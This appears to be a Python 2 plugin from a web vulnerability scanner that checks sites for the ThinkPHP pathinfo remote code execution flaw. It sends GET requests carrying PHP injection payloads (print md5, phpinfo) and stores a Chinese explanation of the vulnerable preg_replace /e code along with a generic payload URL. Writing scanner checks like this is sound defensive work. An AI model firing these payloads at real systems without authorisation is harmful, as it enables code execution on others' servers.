#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import MySQLdb
import httplib2
import urlparse
import logging
#from lib.common import *
class ThinkphpVuls:
    def __init__(self,http,ob,item):
        self.ob=ob
        self.http=http
        self.task_id=ob['task_id']
        self.domain_id=ob['domain_id']
        self.url_list_table="url_list_"+ob['task_id']
        self.web_timeout=ob['web_timeout']
        self.level=ob['level']
        self.url=item['url']
        #self.vuldict={}
    #end def
    def MysqlGetUrl(self):
        
        try:
            
            parse=urlparse.urlparse(self.url)
            urls=parse.path
            if urls=="" or urls=="/":
                return self.url
            urls=self.url.split("/")
            urls=urls[len(urls)-1]
            if urls=="" or urls.find(".")<0:
                return  self.url
            else:
                return False      
        except Exception,e:
            logging.getLogger().error("mysql MysqlGetUrl Exception(DirectoryTraversal.py):" + str(e))
            return False
        
    def audit(self):
        try:
            
            
            result=[]
            needurl=self.MysqlGetUrl()
            if needurl:
                response,content=requestUrl(self.http,needurl+"/index.php/Index/index/name/$%7B@print%20md5(NVS_SERVER_TEST_THINKPHP)%7D",self.task_id,self.domain_id)
                if content.find("d7ffe7b0c7265a42b27c62b5ef5a974a")>=0:
                    detail=u"官方表述是：该URL安全漏洞会造成用户在客户端伪造URL，执行非法代码。分析一下官方的补丁:\
                            /trunk/ThinkPHP/Lib/Core/Dispatcher.class.php\n125 - $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=\"\\2\";', implode($depr,$paths));\n\
                            125 + $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\\'\\\1\']=\\'\\\2\\';', implode($depr,$paths));\n\
                                                                                这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。\
                                                                                    然而在用正则解析pathinfo的时候，主要是这一句：\
                            $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\\'\\\1\\']=\"\\2\";', implode($depr,$paths));\
                                                                                这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行，作者用这种方式在第二个参数中，利用PHP代码给数组动态赋值。\
                            '$var[\'\\1\']=\"\\2\";'\
                                                                                而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：\
                            index.php/module/action/param1/${@print(THINK_VERSION)}"
                    request=getRequest(needurl+"/index.php/Index/index/name/$%7B@print(NVS_TEST_THINKPHP)%7D",'GET')
                    response=getResponse(response,"")
                    self.ob['status']="1"
                    result.append(getRecord(self.ob,needurl,self.ob['level'],detail,request,response))
                else:
                    response2,content2=requestUrl(self.http,needurl+"/index.php",self.task_id,self.domain_id)
                    response,content=requestUrl(self.http,needurl+"/index.php/Index/index/name/$%7B@phpinfo()%7D",self.task_id,self.domain_id)
                    if content.find("<title>phpinfo()</title>")>=0 and content2.find("<title>phpinfo()</title>")<0:
                        detail=u"官方表述是：该URL安全漏洞会造成用户在客户端伪造URL，执行非法代码。分析一下官方的补丁:\
                                /trunk/ThinkPHP/Lib/Core/Dispatcher.class.php\n125 - $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']=\"\\2\";', implode($depr,$paths));\n\
                                125 + $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\\'\\\1\']=\\'\\\2\\';', implode($depr,$paths));\n\
                                                                                    这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。\
                                                                                        然而在用正则解析pathinfo的时候，主要是这一句：\
                                $res = preg_replace('@(w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\\'\\\1\\']=\"\\2\";', implode($depr,$paths));\
                                                                                    这里明显使用了preg_replace的/e参数，这是个非常危险的参数，如果用了这个参数，preg_replace第二个参数就会被当做php代码执行，作者用这种方式在第二个参数中，利用PHP代码给数组动态赋值。\
                                '$var[\'\\1\']=\"\\2\";'\
                                                                                    而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：\
                                index.php/module/action/param1/${@print(THINK_VERSION)}"
                        detail=detail.encode('utf8')
                        request=getRequest(needurl+"/iindex.php/Index/index/name/$%7B@phpinfo()%7D",'GET')
                        response=getResponse(response,"")
                        self.ob['status']="1"
                        result.append(getRecord(self.ob,needurl,self.ob['level'],detail,request,response))
            return result
                        
        except Exception,e:
            logging.getLogger().error("File:ThinkPHPcmdexe2014.py, audit function :" + str(e) + ",task id:" + self.task_id + ", domain id:" + self.domain_id + ", url:" + needurl)
            return []
def run_url(http,ob,item):
    try:
        
        if ob['status']=="0": 
               
            ThinkphpVulsclass=ThinkphpVuls(http,ob,item)
            vuls=ThinkphpVulsclass.audit()
            return vuls
    except Exception,e:
        logging.getLogger().error("File:ThinkPHPcmdexe2014.py, run_url function :" + str(e) + ",task id:" + ob['task_id'] + ", domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ThinkPHPcmdexe2014.py, run_url function :" + str(e))
        return []     
        
